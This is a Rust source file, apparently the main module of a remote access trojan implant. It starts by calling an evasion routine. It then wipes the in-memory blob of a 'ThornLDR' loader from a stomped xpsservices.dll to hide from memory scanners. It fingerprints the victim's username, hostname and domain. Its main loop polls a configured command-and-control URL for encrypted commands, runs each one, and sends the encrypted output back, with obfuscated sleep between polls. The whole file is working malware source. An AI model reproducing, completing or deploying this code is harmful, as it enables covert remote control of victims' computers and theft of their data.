mod channel;
mod config;
mod crypto;
mod evasion;
mod exec;
mod inject;
mod sleep;

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use rand::Rng;
use std::time::{Duration, Instant};

/// Build rat_id matching the payroll.ps1 format:
/// base64(rand5:imp_id:username:hostname:domain)
fn build_rat_id(imp_id: &str) -> String {
    let prefix: String = (0..5)
        .map(|_| rand::thread_rng().gen_range(b'a'..=b'z') as char)
        .collect();
    let username = std::env::var("USERNAME").unwrap_or_default();
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_default();
    let domain   = std::env::var("USERDNSDOMAIN").unwrap_or_else(|_| hostname.clone());
    B64.encode(format!("{}:{}:{}:{}:{}", prefix, imp_id, username, hostname, domain))
}

/// Clean up the ThornLDR blob that injected us into this stomped module.
/// The loader stashes blob info at the module base (wiped PE header area):
///   [0..8]   "THORNBLB"
///   [8..16]  blob_base  u64
///   [16..24] blob_total u64
///
/// We VirtualProtect the blob to RW, zero it, then VirtualFree it.
/// This removes RX private memory and PE signatures from scanner results.
unsafe fn cleanup_loader_blob() {
    use windows::core::s;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::Foundation::HMODULE;
    use windows::core::PCSTR;

    // Find our stomped module base
    let h = match GetModuleHandleA(s!("xpsservices.dll")) {
        Ok(h) => h.0 as *const u8,
        Err(_) => return,
    };

    // Check for THORNBLB magic
    if std::ptr::read_unaligned(h as *const [u8; 8]) != *b"THORNBLB" {
        return;
    }

    let blob_base = std::ptr::read_unaligned(h.add(8) as *const u64) as *mut u8;
    let blob_total = std::ptr::read_unaligned(h.add(16) as *const u64) as usize;

    if blob_base.is_null() || blob_total == 0 {
        return;
    }

    // Resolve VirtualProtect and VirtualFree from kernel32
    let k32 = match GetModuleHandleA(s!("kernel32")) {
        Ok(h) => h,
        Err(_) => return,
    };

    type FnVirtualProtect = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
    type FnVirtualFree    = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;

    let vp = match GetProcAddress(k32, PCSTR(b"VirtualProtect\0".as_ptr())) {
        Some(f) => std::mem::transmute::<_, FnVirtualProtect>(f),
        None => return,
    };
    let vf = match GetProcAddress(k32, PCSTR(b"VirtualFree\0".as_ptr())) {
        Some(f) => std::mem::transmute::<_, FnVirtualFree>(f),
        None => return,
    };

    // VirtualProtect blob to RW so we can zero it
    let mut old_prot: u32 = 0;
    if vp(blob_base, blob_total, 0x04 /* PAGE_READWRITE */, &mut old_prot) != 0 {
        // Zero the entire blob
        std::ptr::write_bytes(blob_base, 0, blob_total);
        // Free the blob pages
        vf(blob_base, 0, 0x8000 /* MEM_RELEASE */);
    }

    // Clear the info block from our header area so no trace remains
    std::ptr::write_bytes(h as *mut u8, 0, 24);
}

fn main() {
    evasion::evade();
    unsafe { cleanup_loader_blob() };

    let cfg     = unsafe { &*(&raw const config::IMPLANT_CONFIG) };
    let key     = cfg.key();
    let iv      = cfg.iv();
    let station = cfg.url();
    let imp_id  = cfg.imp_id();

    let rat_id = build_rat_id(&imp_id);

    let mut last_task = Instant::now();
    const DEAD_MANS_SWITCH: Duration = Duration::from_secs(10 * 3600);

    loop {
        if last_task.elapsed() > DEAD_MANS_SWITCH {
            return;
        }

        if let Some(enc_task) = channel::get_task(&station, &rat_id) {
            if let Ok(task_data) = crypto::decrypt(&enc_task, key, iv) {
                // task_data = "task_id:base64_command"
                if let Some((task_id, b64_cmd)) = task_data.split_once(':') {
                    if let Ok(cmd_bytes) = B64.decode(b64_cmd.trim()) {
                        if let Ok(cmd) = String::from_utf8(cmd_bytes) {
                            last_task = Instant::now();
                            let output    = exec::run(cmd.trim());
                            let b64_out   = B64.encode(output.as_bytes());
                            let plaintext = format!("{}:{}", task_id, b64_out);
                            let encrypted = crypto::encrypt(&plaintext, key, iv);
                            channel::task_io(&station, &encrypted);
                        }
                    }
                }
            }
        }

        let sleep_ms = {
            let configured = exec::SLEEP_MS.load(std::sync::atomic::Ordering::Relaxed);
            if configured > 0 { configured as u64 }
            else { rand::thread_rng().gen_range(5u64..=10u64) * 1000 }
        };
        unsafe { sleep::obf_sleep(sleep_ms as u32) };
    }
}
